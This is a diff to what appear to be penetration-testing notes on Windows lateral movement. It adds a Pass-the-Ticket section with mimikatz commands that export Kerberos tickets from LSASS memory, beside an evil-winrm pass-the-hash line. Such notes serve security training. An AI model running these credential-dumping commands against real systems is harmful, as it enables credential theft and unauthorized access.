@@ -242,3 +242,10 @@ Connect to WinRM using PtH:
 `evil-winrm -i VICTIM_IP -u MyUser -H NTLM_HASH`
 
 ### Kerberos Authentication
+#### Pass-the-Ticket
+Sometimes it will be possible to extract Kerberos tickets and session keys from LSASS memory using mimikatz. The process usually requires us to have SYSTEM privileges on the attacked machine and can be done as follows:
+```
+mimikatz # privilege::debug
+mimikatz # sekurlsa::tickets /export
+```
+`/export`: output the file "tickets.kirbi"
